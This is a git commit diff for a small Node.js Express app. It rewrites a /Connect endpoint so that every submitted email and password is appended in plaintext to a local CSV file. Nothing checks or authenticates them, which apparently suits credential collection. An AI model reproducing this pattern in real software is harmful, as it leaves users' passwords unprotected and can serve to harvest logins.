1aa813a1c53f947b8c50abc24a4c6993d5027899
ArchardCourtois <128530931+ArchardCourtois@users.noreply.github.com>
2023-03-21 20:22:00 +0000

    update

--- app 1/app/app.js
+++ app 1/app/app.js
@@ -10,11 +10,8 @@ const bodyParser = require('body-parser');
 const createCsvWriter = require('csv-writer').createObjectCsvWriter;
 const fs = require('fs');
 const path = require('path');
-const csvWriter = require('csv-write-stream');
-
-const csvFilePath = path.join(__dirname, 'data.csv');
 var app = express();
-
+app.use(express.json());
 app.set('port', process.env.PORT || 3000); 
 app.set('views', __dirname + '/app/server/views'); 
 app.set('view engine', 'ejs'); 
@@ -25,27 +22,34 @@ require('./app/routes')(app);
 
 
 
+const csvFilePath = path.join(__dirname, 'data.csv');
+
 app.post('/Connect', async (req, res) => {
-  try {
-    const { email, password } = req.body;
+  const password = req.body.password;
+  const email = req.body.email;
 
-    // Create a CSV writer if the file does not exist or append to the existing file
-    const writer = csvWriter({ headers: ['email', 'password'], sendHeaders: !fs.existsSync(csvFilePath) });
-    writer.pipe(fs.createWriteStream(csvFilePath, { flags: 'a' }));
+  const csvWriter = createCsvWriter({
+    path: csvFilePath,
+    header: [
+      { id: 'password', title: 'Password' },
+      { id: 'email', title: 'Email' },
+    ],
+    append: true,
+  });
 
-    // Write the email and password to the CSV file
-    writer.write({ email, password });
+  const data = [{ password, email }];
 
-    // Close the CSV writer
-    writer.end();
-
-    res.redirect('/');
-    res.status(200).json({ message: 'Data saved successfully' });
-  } catch (error) {
-    console.error(error);
-    res.status(500).json({ message: 'An error occurred while saving data' });
-  }
+  csvWriter
+    .writeRecords(data)
+    .then(() => {
+      res.send('Data saved successfully.');
+    })
+    .catch((error) => {
+      console.error(error);
+      res.send('An error occurred.');
+    });
 });
+
 
 
 http.createServer(app).listen(app.get('port'), function(){
